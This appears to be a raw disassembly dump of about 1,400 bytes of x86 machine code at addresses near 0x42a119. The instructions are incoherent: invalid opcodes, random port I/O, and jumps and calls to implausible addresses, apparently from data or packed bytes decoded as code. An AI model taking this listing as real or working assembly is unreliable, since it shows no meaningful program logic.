  42a119:	and    ecx,DWORD PTR [ecx+0x7a23c069]
  42a11f:	sub    ah,BYTE PTR [esp+eax*2]
  42a122:	cdq    
  42a123:	add    al,BYTE PTR [ecx]
  42a125:	jns    0x42a158
  42a127:	faddp  st(4),st
  42a129:	add    dh,BYTE PTR [ecx]
  42a12b:	fdivp  st(0),st
  42a12d:	add    ch,BYTE PTR [ecx]
  42a12f:	fdivrp st(4),st
  42a131:	add    dl,cl
  42a133:	fld    TBYTE PTR [eax+eiz*8]
  42a136:	bound  ecx,QWORD PTR [ecx]
  42a138:	addr16 mov bh,0xaf
  42a13b:	sbb    DWORD PTR [edx-0x7c],esi
  42a13e:	sub    esi,ebx
  42a140:	fld    DWORD PTR [ebx]
  42a142:	sub    DWORD PTR [edi],eax
  42a144:	bound  esi,QWORD PTR [eax+0x3b50f656]
  42a14a:	xor    al,0x18
  42a14c:	push   edx
  42a14d:	jp     0x42a0fc
  42a14f:	sub    eax,0x19abf1e7
  42a154:	mov    ebp,0x622a5edf
  42a159:	sti    
  42a15a:	jb     0x42a175
  42a15c:	fs mov al,0x96
  42a15f:	out    0x40,al
  42a161:	stc    
  42a162:	popf   
  42a163:	sbb    BYTE PTR [edx],ah
  42a165:	and    eax,0x1bc8dee1
  42a16a:	enter  0xe90b,0x3
  42a16e:	dec    esi
  42a16f:	mov    es,esp
  42a171:	fistp  DWORD PTR [edx-0x5a]
  42a174:	out    dx,eax
  42a175:	add    esi,DWORD PTR [ebp+0x19]
  42a178:	jne    0x42a159
  42a17a:	add    BYTE PTR [eax],al
  42a17c:	add    BYTE PTR [eax],al
  42a17e:	add    BYTE PTR [edx+0x2a],ah
  42a181:	xchg   dl,bh
  42a183:	sub    bl,BYTE PTR [ecx]
  42a185:	mov    al,ch
  42a187:	clc    
  42a188:	inc    esp
  42a189:	ds jns 0x42a19c
  42a18c:	mov    bh,0xa6
  42a18e:	call   DWORD PTR [edx]
  42a190:	scas   al,BYTE PTR es:[edi]
  42a191:	pop    ebp
  42a192:	pop    ss
  42a193:	mov    bl,BYTE PTR [esi]
  42a195:	rol    DWORD PTR [eax+0x78ed0a80],1
  42a19b:	mov    ebx,0x7599ef93
  42a1a0:	sub    al,BYTE PTR [eax]
  42a1a2:	fcom   QWORD PTR [eax+0x74c2fb1d]
  42a1a8:	call   0xb7be146c
  42a1ad:	mov    ebp,0x86af76e5
  42a1b2:	test   ebp,esi
  42a1b4:	sbb    eax,0x11b6af8
  42a1b9:	add    al,0x72
  42a1bb:	xor    al,0xa8
  42a1bd:	or     BYTE PTR [ebx],dl
  42a1bf:	jns    0x42a1eb
  42a1c1:	bnd je 0x42a215
  42a1c4:	sbb    eax,0x58a4ebe7
  42a1c9:	xchg   DWORD PTR [ebx+esi*4+0x56],ecx
  42a1cd:	add    al,0xe9
  42a1cf:	pop    ecx
  42a1d0:	mov    fs,WORD PTR [ebx]
  42a1d2:	in     eax,dx
  42a1d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a1d4:	sahf   
  42a1d5:	add    bl,al
  42a1d7:	ja     0x42a203
  42a1d9:	aas    
  42a1da:	inc    ebp
  42a1db:	push   ecx
  42a1dc:	sbb    eax,0x1b76e5be
  42a1e1:	je     0x42a1f0
  42a1e3:	add    BYTE PTR [eax],al
  42a1e5:	add    BYTE PTR [eax],al
  42a1e7:	add    BYTE PTR [ebp-0x38],dh
  42a1ea:	gs jmp 0xdc2aa4ec
  42a1f0:	xchg   edx,eax
  42a1f1:	sbb    edi,ebx
  42a1f3:	sub    edx,DWORD PTR [edx+0x18]
  42a1f6:	push   esp
  42a1f7:	bound  esp,QWORD PTR [edx-0x7f]
  42a1fa:	in     al,dx
  42a1fb:	lds    esi,FWORD PTR [edx+eax*1+0x0]
  42a1ff:	call   0x32e:0x7c7f3145
  42a206:	push   ebx
  42a207:	bound  ebx,QWORD PTR [edx+ecx*4+0x5d]
  42a20b:	out    dx,al
  42a20c:	sub    BYTE PTR es:[esi],0xe8
  42a210:	jbe    0x42a214
  42a212:	xchg   DWORD PTR [esi],esp
  42a214:	jge    0x42a1ba
  42a216:	cmp    cl,dh
  42a218:	addr16 jle 0x42a23d
  42a21b:	call   0x94a496
  42a220:	pop    esp
  42a221:	jecxz  0x42a237
  42a223:	test   bh,cl
  42a225:	inc    ebx
  42a226:	sti    
  42a227:	and    BYTE PTR [esi+edi*8],0x6
  42a22b:	test   DWORD PTR ds:0x13fffffe,edi
  42a231:	jl     0x42a232
  42a233:	mov    WORD PTR [ecx-0x16],gs
  42a236:	jp     0x42a200
  42a238:	jecxz  0x42a220
  42a23a:	sub    eax,0x83e3f3f9
  42a23f:	rol    bl,0x7f
  42a242:	test   BYTE PTR [eax],0x9c
  42a245:	add    ecx,DWORD PTR [ebp-0x91dff7b]
  42a24b:	inc    DWORD PTR [eax]
  42a24d:	add    BYTE PTR [eax],al
  42a24f:	add    BYTE PTR [eax],al
  42a251:	jl     0x42a239
  42a253:	loope  0x42a2bc
  42a255:	mov    WORD PTR [ebx],es
  42a257:	test   al,al
  42a259:	test   al,0x5e
  42a25b:	div    BYTE PTR [ebp+0x38]
  42a25e:	out    0xd0,al
  42a260:	les    esi,FWORD PTR [edx]
  42a262:	jecxz  0x42a1e6
  42a264:	lock ja 0x42a256
  42a267:	jae    0x42a2b6
  42a269:	or     dh,BYTE PTR [edx-0x7b]
  42a26c:	fsub   QWORD PTR [ecx-0x3af091d]
  42a272:	jmp    0xc084:0xe3934a3f
  42a279:	call   0xea41ecb5
  42a27e:	fimul  WORD PTR [ebp+eax*2+0x5d884e5c]
  42a285:	cmp    al,0x86
  42a287:	pop    ebp
  42a288:	hlt    
  42a289:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a28a:	inc    ecx
  42a28b:	repz call 0x3df9b2
  42a291:	cwde   
  42a292:	mov    esi,0x3a131973
  42a297:	mul    esp
  42a299:	pop    edi
  42a29a:	dec    BYTE PTR [ebp+eax*4-0x4dfb28b]
  42a2a1:	add    bl,cl
  42a2a3:	nop
  42a2a4:	inc    ebp
  42a2a5:	add    eax,0x510c2bf9
  42a2aa:	sub    edi,edi
  42a2ac:	xchg   DWORD PTR [eax],esi
  42a2ae:	push   eax
  42a2af:	nop
  42a2b0:	inc    ebp
  42a2b1:	in     eax,0x40
  42a2b3:	jl     0x42a30e
  42a2b5:	add    BYTE PTR [eax],al
  42a2b7:	add    BYTE PTR [eax],al
  42a2b9:	add    BYTE PTR [ebp+0x29],dh
  42a2bc:	mov    ecx,0xff118de7
  42a2c1:	(bad)  
  42a2c2:	clc    
  42a2c3:	cmc    
  42a2c4:	daa    
  42a2c5:	call   0xfb6113e2
  42a2ca:	into   
  42a2cb:	dec    ecx
  42a2cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a2cd:	add    esi,DWORD PTR [ecx+ebp*1-0x1]
  42a2d1:	mov    eax,?
  42a2d3:	ins    BYTE PTR es:[edi],dx
  42a2d4:	and    bl,bh
  42a2d6:	mov    ds:0x71731ef8,al
  42a2db:	mov    al,ds:0x69641ff7
  42a2e0:	inc    DWORD PTR [edi+0x48]
  42a2e3:	sub    eax,DWORD PTR [eax+eax*1]
  42a2e6:	jne    0x42a318
  42a2e8:	test   eax,0x3c030c1
  42a2ed:	cmp    al,dl
  42a2ef:	aam    0x92
  42a2f1:	pop    esp
  42a2f2:	(bad)  
  42a2f3:	popw   es
  42a2f5:	das    
  42a2f6:	imul   ebp,DWORD PTR [ecx+0x3e0fe16],0xffffff83
  42a2fd:	rcl    BYTE PTR [ebx+0x5c],0x82
  42a301:	ret    
  42a302:	jge    0x42a358
  42a304:	daa    
  42a305:	aad    0x49
  42a307:	add    eax,0x4145871e
  42a30c:	adc    dh,BYTE PTR [ebp+0x78]
  42a30f:	xchg   ebx,eax
  42a310:	mov    edi,0xad511efa
  42a315:	add    dh,al
  42a317:	ins    DWORD PTR es:[edi],dx
  42a318:	nop
  42a319:	test   DWORD PTR [ecx],edi
  42a31b:	add    esp,esp
  42a31d:	and    DWORD PTR [eax],eax
  42a31f:	add    BYTE PTR [eax],al
  42a321:	add    BYTE PTR [eax],al
  42a323:	push   cs
  42a324:	mov    bl,0x35
  42a326:	mov    ch,0xf
  42a328:	lock cmp ch,dh
  42a32b:	inc    edx
  42a32c:	add    ah,BYTE PTR [esi+0x1c]
  42a32f:	push   ebp
  42a330:	add    eax,0xdaefc762
  42a335:	sbb    esp,DWORD PTR [ecx]
  42a337:	pusha  
  42a338:	in     al,dx
  42a339:	adc    eax,0x5bac33b5
  42a33e:	xchg   DWORD PTR [ecx+0x2521a217],edi
  42a344:	sub    al,bh
  42a346:	or     dh,0x15
  42a349:	ins    BYTE PTR es:[edi],dx
  42a34a:	inc    esp
  42a34b:	outs   dx,BYTE PTR ds:[esi]
  42a34c:	outs   dx,DWORD PTR ds:[esi]
  42a34d:	and    al,0x21
  42a34f:	daa    
  42a350:	sub    cl,BYTE PTR [esi+0x9]
  42a353:	jne    0x42a357
  42a355:	sbb    ecx,DWORD PTR [esi-0x42edead0]
  42a35b:	lods   eax,DWORD PTR ds:[esi]
  42a35c:	inc    eax
  42a35d:	in     eax,0x3
  42a35f:	lea    esi,[edi]
  42a361:	mov    bh,0x20
  42a363:	mov    ss,WORD PTR [edx-0x18]
  42a366:	inc    ebp
  42a367:	jno    0x42a36b
  42a369:	mov    dh,0xad
  42a36b:	adc    al,0x2d
  42a36e:	scas   al,BYTE PTR es:[edi]
  42a36f:	jp     0x42a331
  42a371:	push   eax
  42a372:	sbb    al,ah
  42a374:	adc    eax,0xb92a8e3a
  42a379:	or     BYTE PTR es:[ebp+0x2a],dh
  42a37d:	cwde   
  42a37e:	lds    ebx,FWORD PTR [ebp+edx*1+0x27]
  42a382:	or     BYTE PTR [ebp-0x4f],dh
  42a385:	mov    cl,0xab
  42a387:	add    BYTE PTR [eax],al
  42a389:	add    BYTE PTR [eax],al
  42a38b:	add    BYTE PTR [esi-0x6f],cl
  42a38e:	test   al,0x3
  42a390:	fild   DWORD PTR [edx]
  42a392:	xlat   BYTE PTR ds:[ebx]
  42a393:	cmp    al,0x3e
  42a395:	out    dx,eax
  42a396:	fs hlt 
  42a398:	jb     0x42a39c
  42a39a:	outs   dx,BYTE PTR ds:[esi]
  42a39b:	sbb    al,0xf0
  42a39d:	adc    al,0x0
  42a39f:	jge    0x42a3eb
  42a3a1:	scas   al,BYTE PTR es:[edi]
  42a3a2:	xchg   BYTE PTR [esi+eiz*4-0x3316c00e],bh
  42a3a9:	sahf   
  42a3aa:	call   ecx
  42a3ac:	add    DWORD PTR [ebx-0xe0d0306],esi
  42a3b2:	aas    
  42a3b3:	jmp    0xeeb6e5ab
  42a3b8:	sbb    BYTE PTR es:0xffd4e689,dl
  42a3bf:	push   ds
  42a3c0:	sbb    al,0x18
  42a3c2:	aad    0x62
  42a3c4:	xchg   BYTE PTR [edi-0xe],bh
  42a3c7:	sbb    al,0x9d
  42a3c9:	mov    dl,0x52
  42a3cb:	pop    edx
  42a3cc:	ja     0x42a3e7
  42a3ce:	adc    eax,0xffd4c671
  42a3d3:	cs cli 
  42a3d5:	mov    bh,0x85
  42a3d7:	stos   BYTE PTR es:[edi],al
  42a3d8:	icebp  
  42a3d9:	push   esi
  42a3da:	add    al,0xe9
  42a3dc:	push   ebp
  42a3dd:	mov    fs,WORD PTR [ebx]
  42a3df:	in     eax,dx
  42a3e0:	call   0x7145a483
  42a3e5:	sub    cl,BYTE PTR [edi+0x63]
  42a3e8:	push   ebp
  42a3e9:	sbb    DWORD PTR [esi+0x741976e5],edi
  42a3ef:	or     eax,0x0
  42a3f4:	add    BYTE PTR [ebp-0x3c],ch
  42a3f7:	gs jmp 0xac25b8c5
  42a3fd:	nop
  42a3fe:	pop    ss
  42a3ff:	sti    
  42a400:	sub    esi,DWORD PTR [edx+0x2]
  42a403:	push   ebp
  42a404:	bound  edx,QWORD PTR [edx+0x6d09ec81]
  42a40a:	add    al,BYTE PTR [eax]
  42a40c:	mov    edi,0xbb5870d
  42a411:	imul   edx,DWORD PTR [edi],0x2a6062fb
  42a417:	stc    
  42a418:	push   edi
  42a419:	xchg   esp,eax
  42a41a:	pop    ss
  42a41b:	add    eax,0x6e00
  42a420:	add    BYTE PTR [esi],al
  42a422:	or     al,0x4b
  42a424:	push   0xc
  42a426:	test   DWORD PTR [ebp-0x28],esi
  42a429:	pop    edi
  42a42b:	imul   al
  42a42d:	lock shl dh,cl
  42a430:	call   DWORD PTR [ecx-0x68e28a42]
  42a436:	mov    esp,0xde94684f
  42a43b:	cmp    al,BYTE PTR [eax]
  42a43d:	imul   ecx,DWORD PTR [ecx-0xbd40230],0x4652e84f
  42a447:	idiv   bh
  42a449:	push   ecx
  42a44a:	mov    esi,0x8b1c9506
  42a44f:	shl    BYTE PTR [ebp-0x3b],0x30
  42a453:	mov    ebx,0xd0895566
  42a458:	std    
  42a459:	add    BYTE PTR [eax],al
  42a45b:	add    BYTE PTR [eax],al
  42a45d:	add    bl,ch
  42a45f:	repz mov eax,0xffff9dee
  42a465:	mov    WORD PTR [ecx],ss
  42a467:	loopne 0x42a45b
  42a469:	jmp    FWORD PTR [ebx]
  42a46b:	mov    esp,0x454cffff
  42a470:	je     0x42a46b
  42a472:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a473:	stos   DWORD PTR es:[edi],eax
  42a474:	add    BYTE PTR [eax-0x64],0x72
  42a478:	test   eax,edx
  42a47a:	sub    ebx,esi
  42a47c:	not    BYTE PTR [eax+0x2b]
  42a47f:	sbb    DWORD PTR [ebx+0x7aff1c11],edx
  42a485:	jge    0x42a4eb
  42a487:	(bad)  
  42a488:	ins    DWORD PTR es:[edi],dx
  42a489:	and    al,0xd7
  42a48b:	cmp    edi,edi
  42a48d:	gs iret 
  42a48f:	ss sti 
  42a491:	jae    0x42a50a
  42a493:	dec    esi
  42a494:	not    BYTE PTR ds:0x3b107c
  42a49a:	jne    0x42a4c4
  42a49c:	aas    
  42a49d:	push   eax
  42a49e:	cmp    ch,BYTE PTR [ebx+eax*1-0x73]
  42a4a2:	clc    
  42a4a3:	clc    
  42a4a4:	and    bl,bh
  42a4a6:	sub    bh,BYTE PTR [ecx+0x27]
  42a4a9:	in     al,0x96
  42a4ab:	sub    edi,edi
  42a4ad:	out    0x69,al
  42a4af:	mov    dh,0x88
  42a4b1:	rcl    BYTE PTR [eax],1
  42a4b3:	sbb    al,0x1a
  42a4b5:	push   eax
  42a4b6:	sbb    eax,0x2fa694f
  42a4bb:	int3   
  42a4bc:	mov    ecx,0xff1d37c8
  42a4c1:	push   esp
  42a4c2:	add    BYTE PTR [eax],al
  42a4c4:	add    BYTE PTR [eax],al
  42a4c6:	add    dh,bh
  42a4c8:	sub    al,0x7e
  42a4ca:	in     al,0xed
  42a4cc:	stc    
  42a4cd:	mov    ah,0x4e
  42a4cf:	dec    ebx
  42a4d0:	sahf   
  42a4d1:	xchg   edx,eax
  42a4d2:	and    ebp,DWORD PTR [ebp+0x41]
  42a4d5:	out    dx,eax
  42a4d6:	xor    BYTE PTR [ebp+0x29],dh
  42a4d9:	xchg   dl,al
  42a4db:	fnstsw WORD PTR [edi-0x5b3d002c]
  42a4e1:	ds je  0x42a543
  42a4e4:	adc    DWORD PTR [esi+0x1a],0x14e2975
  42a4eb:	clc    
  42a4ec:	in     al,0xe7
  42a4ee:	pop    es
  42a4ef:	lea    eax,[edx-0x2c]
  42a4f2:	call   FWORD PTR [edx+0x2ebf8602]
  42a4f8:	nop
  42a4f9:	daa    
  42a4fa:	pop    ebp
  42a4fb:	mov    bh,0x1c
  42a4fd:	jmp    FWORD PTR ds:0xe82bbf9e
  42a503:	dec    ebx
  42a504:	xor    al,0xff
  42a506:	jmp    DWORD PTR ds:0x7504411b
  42a50c:	mov    bl,0x75
  42a50e:	or     esi,DWORD PTR [ebp+0x1b]
  42a511:	dec    edi
  42a512:	add    DWORD PTR [edi],esi
  42a514:	sub    bh,bh
  42a516:	cs xor eax,0x7da5a903
  42a51c:	add    esp,DWORD PTR [edi]
  42a51e:	pop    es
  42a51f:	jne    0x42a4c9
  42a521:	gs or  al,0x3b
  42a524:	(bad)  
  42a525:	call   0x9c451e6b
  42a52a:	mov    al,BYTE PTR [eax]
  42a52c:	add    BYTE PTR [eax],al
  42a52e:	add    BYTE PTR [eax],al
  42a530:	sbb    DWORD PTR [esi-0x7a3be4fb],eax
  42a536:	je     0x42a543
  42a538:	je     0x42a4ef
  42a53a:	xchg   edx,eax
  42a53b:	mov    dh,0xfb
  42a53d:	sub    al,0x6e
  42a53f:	adc    eax,DWORD PTR [esi+0x1a441706]
  42a545:	shl    BYTE PTR [ebp-0x62],0x76
  42a549:	add    dl,BYTE PTR [esp+eiz*8+0x5a]
  42a54d:	(bad)  
  42a54e:	jmp    0x825d1a56
  42a553:	pop    es
  42a554:	jne    0x42a558
  42a556:	ins    BYTE PTR es:[edi],dx
  42a557:	inc    esp
  42a558:	popa   
  42a559:	sti    
  42a55a:	pop    ebp
  42a55b:	sbb    al,0xdd
  42a55d:	loopne 0x42a5be
  42a55f:	sbb    eax,0xd0e71dce
  42a564:	add    bh,BYTE PTR [ebx+ebp*1+0x8]
  42a568:	lock inc edx
  42a56a:	adc    eax,0xec90fa36
  42a56f:	sub    ecx,DWORD PTR [ebp-0x6e285b4]
  42a575:	inc    edx
  42a576:	std    
  42a577:	dec    ecx
  42a578:	dec    edx
  42a579:	adc    DWORD PTR [edx],esp
  42a57b:	fist   DWORD PTR [ecx]
  42a57d:	cli    
  42a57e:	(bad)  
  42a580:	(bad)  
  42a581:	(bad)  
  42a582:	popf   
  42a583:	sbb    eax,0x71410607
  42a588:	ret    
  42a589:	adc    DWORD PTR [edx-0x3b],ecx
  42a58c:	stos   DWORD PTR es:[edi],eax
  42a58d:	(bad)  
  42a58e:	lock xchg ecx,eax
  42a590:	pop    edi
  42a591:	push   edx
  42a592:	call   0x42a653
  42a597:	add    BYTE PTR [eax],al
  42a599:	mov    esp,0x9261ffad
  42a59e:	scas   eax,DWORD PTR es:[edi]
  42a59f:	mov    ebp,0x86b776e5
  42a5a4:	adc    eax,0xeb081df6
  42a5a9:	jbe    0x42a5ad
  42a5ab:	dec    edi
  42a5ac:	bound  edi,QWORD PTR [esi-0x77]
  42a5af:	aas    
  42a5b0:	in     eax,0xe8
  42a5b2:	test   eax,eax
  42a5b4:	div    dl
  42a5b6:	jbe    0x42a5b8
  42a5b8:	jmp    0xe5932f33
  42a5bd:	inc    ebp
  42a5be:	cmp    al,BYTE PTR [ebp-0x77797fe5]
  42a5c4:	jmp    0x29c9a83f
  42a5c9:	jno    0x42a554
  42a5cb:	xor    dl,ch
  42a5cd:	sub    BYTE PTR [ecx],cl
  42a5cf:	jg     0x42a57a
  42a5d1:	jp     0x42a59b
  42a5d3:	je     0x42a591
  42a5d5:	repz cmp dh,BYTE PTR [edi+esi*1+0xf]
  42a5da:	stc    
  42a5db:	out    0xa,eax
  42a5dd:	jb     0x42a5e1
  42a5df:	add    BYTE PTR [esi+esi*1-0x6a],ah
  42a5e3:	push   ds
  42a5e4:	jb     0x42a5a3
  42a5e6:	add    al,0xc3
  42a5e8:	jmp    0xe9832f5f
  42a5ed:	cmc    
  42a5ee:	mov    eax,ds:0xa1f5e90b
  42a5f3:	psubsw mm6,QWORD PTR [ecx]
  42a5f6:	ret    0xe107
  42a5f9:	in     eax,dx
  42a5fa:	sar    edi,0xae
  42a5fd:	add    BYTE PTR [eax],al
  42a5ff:	add    BYTE PTR [eax],al
  42a601:	add    BYTE PTR [esi-0x419fff0c],dh
  42a607:	add    al,0x87
  42a609:	pop    ecx
  42a60a:	pop    ebp
  42a60b:	adc    BYTE PTR [esi],ch
  42a60d:	push   edi
  42a60e:	sti    
  42a60f:	adc    esi,DWORD PTR [ebx+ebp*4-0x15]
  42a613:	xchg   al,bh
  42a615:	dec    esp
  42a616:	xchg   ecx,eax
  42a617:	or     edx,DWORD PTR [eax+0x0]
  42a61a:	inc    esi
  42a61b:	or     eax,ebp
  42a61d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a61e:	sbb    edi,ebp
  42a620:	test   BYTE PTR [esp+ecx*4-0x4ea8f489],0x88
  42a628:	clc    
  42a629:	std    
  42a62a:	xchg   ebx,eax
  42a62b:	out    dx,al
  42a62c:	dec    edi
  42a62d:	mov    esp,DWORD PTR [edx-0x25]
  42a630:	jmp    0x42a60d
  42a632:	arpl   si,bp
  42a634:	push   esi
  42a635:	cmp    edi,0x7
  42a638:	add    al,ch
  42a63a:	(bad)  
  42a63b:	ds stc 
  42a63d:	call   FWORD PTR [ecx-0x3f48c3d]
  42a643:	out    dx,al
  42a644:	adc    al,0x4
  42a646:	das    
  42a647:	inc    esp
  42a648:	sti    
  42a649:	scas   eax,DWORD PTR es:[edi]
  42a64a:	sbb    eax,0x1a8b01e1
  42a64f:	pop    esi
  42a650:	add    BYTE PTR [ebx+0x320febd2],cl
  42a656:	sbb    al,0x4d
  42a658:	push   edx
  42a659:	leave  
  42a65a:	push   ds
  42a65b:	add    eax,DWORD PTR [eax]
  42a65d:	dec    di
  42a65f:	std    
  42a660:	cmpxchg ch,cl
  42a663:	lds    eax,FWORD PTR [ebx]
  42a665:	add    BYTE PTR [eax],al
  42a667:	add    BYTE PTR [eax],al
  42a669:	add    BYTE PTR [eax],al
  42a66b:	cmp    al,BYTE PTR [edi+0x52c0409]
  42a671:	mov    edx,0x8252cc04
  42a676:	in     al,dx
  42a677:	dec    ebp
  42a678:	fisub  DWORD PTR [edi+0x4b039c02]
  42a67e:	push   esi
  42a67f:	daa    
  42a680:	test   BYTE PTR [edx+0x8889045],0xff
  42a687:	jnp    0x42a708
  42a689:	(bad)  
  42a68a:	call   0x396167
  42a68f:	add    DWORD PTR [esi],edi
  42a691:	test   BYTE PTR [ecx-0x514eb],0x75
  42a698:	sbb    DWORD PTR [esi],eax
  42a69a:	or     DWORD PTR [ebx+0x1a],0xffffffff
  42a69e:	push   esi
  42a6a0:	cmp    eax,0x45f60013
  42a6a5:	or     eax,DWORD PTR [eax]
  42a6a7:	call   0x2bc967e0
  42a6ac:	adc    al,0x12
  42a6ae:	or     esi,edi
  42a6b0:	mov    es,WORD PTR [ebx]
  42a6b2:	add    BYTE PTR [ebp+0x2c],dh
  42a6b5:	aas    
  42a6b6:	mov    DWORD PTR [eax+0x3144dcf1],esi
  42a6bc:	xor    BYTE PTR [ecx-0xe68b62],al
  42a6c2:	ret    0x9b8
  42a6c5:	add    al,0x0
  42a6c7:	jne    0x42a6e2
  42a6c9:	mov    WORD PTR [ebp+0x1d],es
  42a6cc:	xchg   DWORD PTR [edx+0x7d],eax
  42a6d2:	add    BYTE PTR [eax],al
  42a6d4:	or     eax,0xf0850619
  42a6d9:	sbb    edi,edi
  42a6db:	(bad)  
  42a6dc:	out    dx,al
  42a6dd:	(bad)  [ebx]
  42a6df:	xchg   DWORD PTR [eax+0x35],eax
  42a6e2:	mov    dh,BYTE PTR [edi*2+0x50e84894]
  42a6e9:	pop    ebp
  42a6ea:	push   ss
  42a6eb:	sti    
  42a6ec:	lock pop eax
  42a6ee:	push   es
  42a6ef:	mov    ch,BYTE PTR ds:0xfeffff1a
  42a6f5:	push   eax
  42a6f6:	mov    BYTE PTR [ebp-0x2f],dl
  42a6f9:	xchg   ebx,eax
  42a6fa:	inc    eax
  42a6fb:	call   0xfb59106c
  42a700:	(bad)  
  42a701:	push   eax
  42a702:	xor    bh,0xaa
  42a705:	pop    ss
  42a706:	jnp    0x42a75b
  42a708:	je     0x42a723
  42a70a:	inc    DWORD PTR [esi+edi*4+0x742b7b27]
  42a711:	sbb    edi,edi
  42a713:	mov    al,BYTE PTR cs:[ecx]
  42a716:	repnz push edx
  42a718:	mov    dh,0xa7
  42a71a:	ins    DWORD PTR es:[edi],dx
  42a71b:	push   DWORD PTR [ecx+0x72c3b891]
  42a721:	jg     0x42a6b7
  42a723:	mov    ebx,0x2b420e69
  42a728:	(bad)  
  42a729:	js     0x42a765
  42a72b:	sbb    dh,dl
  42a72d:	inc    esp
  42a72e:	pop    esi
  42a72f:	nop
  42a730:	pop    esi
  42a731:	jp     0x42a70e
  42a733:	mov    bl,0x52
  42a735:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a736:	test   al,0x3
  42a738:	add    BYTE PTR [eax],al
  42a73a:	add    BYTE PTR [eax],al
  42a73c:	add    BYTE PTR [ebp-0x79],dh
  42a73f:	sub    DWORD PTR [edx],ecx
  42a741:	icebp  
  42a742:	inc    esi
  42a743:	jmp    0x83081c4b
  42a748:	xchg   BYTE PTR [esi],ch
  42a74a:	cmc    
  42a74b:	jbe    0x42a796
  42a74d:	or     al,0x24
  42a74f:	jmp    0x9cbc1c57
  42a754:	sbb    edi,esp
  42a756:	mov    bh,0xfc
  42a758:	(bad)  
  42a759:	retf   
  42a75a:	leave  
  42a75b:	mov    ch,0x95
  42a75d:	data16 std 
  42a75f:	xchg   ecx,eax
  42a760:	or     al,0x7a
  42a762:	or     ebx,edi
  42a764:	(bad)  
  42a765:	jle    0x42a6e8
  42a767:	rol    BYTE PTR [edi],1
  42a769:	popa   
  42a76a:	add    eax,0xc8e34466
  42a76f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a770:	xchg   esi,eax
  42a771:	into   
  42a772:	jns    0x42a725
  42a774:	in     eax,dx
  42a775:	enter  0xaa33,0xdd
  42a779:	or     edx,DWORD PTR [edi+0x2d8700]
  42a77f:	fimul  WORD PTR [edx+ecx*2-0x4]
  42a783:	or     al,BYTE PTR [ebp+0xc13ff6d]
  42a789:	pop    ss
  42a78a:	add    eax,0x6e00280d
  42a790:	inc    ebx
  42a791:	sbb    al,BYTE PTR [edx+0x0]
  42a794:	jmp    0x42a797
  42a796:	sar    bl,0x5c
  42a799:	jge    0x42a81a
  42a79b:	add    al,0xe9
  42a79d:	jbe    0x42a7a1
  42a79f:	(bad)  
  42a7a0:	aam    0x0
  42a7a2:	add    BYTE PTR [eax],al
  42a7a4:	add    BYTE PTR [eax],al
  42a7a6:	push   0x7b
  42a7a8:	inc    ebp
  42a7a9:	push   ecx
  42a7aa:	mov    eax,ds:0x76e8fe39
  42a7af:	xchg   al,al
  42a7b1:	mov    ebp,0xb5fb8626
  42a7b6:	or     BYTE PTR gs:[ebp+0x45],dh
  42a7ba:	add    BYTE PTR [ecx-0x18],al
  42a7bd:	in     eax,dx
  42a7be:	cdq    
  42a7bf:	or     ebx,edi
  42a7c1:	jb     0x42a7fd
  42a7c3:	adc    DWORD PTR [edi+0x47b62b4],eax
  42a7c9:	js     0x42a77d
  42a7cb:	inc    edx
  42a7cc:	je     0x42a7a2
  42a7ce:	stc    
  42a7cf:	(bad)  
  42a7d0:	sti    
  42a7d1:	jb     0x42a80d
  42a7d3:	adc    DWORD PTR [ebp+0x378cf7e5],ecx
  42a7d9:	jmp    0xb9c9a7e0
  42a7de:	pop    esi
  42a7df:	shr    ebx,1
  42a7e1:	out    0x5d,al
  42a7e3:	or     DWORD PTR [ebp-0x23],eax
  42a7e6:	pop    ds
  42a7e7:	scas   al,BYTE PTR es:[edi]
  42a7e8:	mul    esi
  42a7ea:	clc    
  42a7eb:	call   0xc57c:0x8d8dcefa
  42a7f2:	jge    0x42a7ed
  42a7f4:	test   BYTE PTR [ebp+0x71fb097c],ch
  42a7fa:	std    
  42a7fb:	add    DWORD PTR [eax],eax
  42a7fd:	jmp    0xe94322a1
  42a802:	jbe    0x42a789
  42a804:	inc    ebp
  42a805:	popf   
  42a806:	repz mov ?,ebx
  42a809:	add    DWORD PTR [eax],0x0
  42a80f:	mov    esp,0x59e9fb0b
  42a814:	sbb    ecx,DWORD PTR [ebx]
  42a816:	add    BYTE PTR [ebx-0x3e],ah
  42a819:	add    BYTE PTR [ecx+edx*8],0x7c
  42a81d:	dec    ebx
  42a81e:	inc    eax
  42a81f:	pushf  
  42a820:	mov    edi,DWORD PTR [edi+0x4d7da774]
  42a826:	or     BYTE PTR [edi+0x3cffce7d],bh
  42a82c:	lea    edi,[edi+0x457f5b75]
  42a832:	lock xlat BYTE PTR ds:[ebx]
  42a834:	inc    esp
  42a835:	pop    es
  42a836:	(bad)  
  42a837:	adc    eax,ebp
  42a839:	mov    al,BYTE PTR [eax]
  42a83b:	dec    esp
  42a83c:	add    BYTE PTR [ecx-0x878bdff],cl
  42a842:	push   ss
  42a843:	add    ebx,edi
  42a845:	add    BYTE PTR [ebp+0x5c],0x7e
  42a849:	dec    ebp
  42a84a:	or     al,0x93
  42a84c:	dec    esp
  42a84d:	repz xchg esp,eax
  42a84f:	sbb    al,0x0
  42a851:	add    BYTE PTR [ecx-0x138280e3],cl
  42a857:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a858:	(bad)  
  42a859:	out    0x4,eax
  42a85b:	sldt   WORD PTR [eax]
  42a85e:	and    ecx,0xffffffd7
  42a861:	add    edi,edi
  42a863:	shr    edi,1
  42a865:	add    BYTE PTR [ebp+0x1c],0x3f
  42a869:	xor    al,BYTE PTR [ebp+0x18]
  42a86c:	add    al,0x7a
  42a86e:	jno    0x42a83a
  42a870:	repz imul bl
  42a873:	add    BYTE PTR [eax],al
  42a875:	add    BYTE PTR [eax],al
  42a877:	add    bl,dl
  42a879:	int3   
  42a87a:	inc    esp
  42a87b:	clc    
  42a87c:	imul   eax,DWORD PTR [esi],0x0
  42a87f:	add    BYTE PTR [edi+0x41],ah
  42a882:	test   DWORD PTR [ebx-0x23180d77],0x65ffffde
  42a88c:	inc    edi
  42a88d:	inc    ecx
  42a88e:	repz jmp 0x42a862
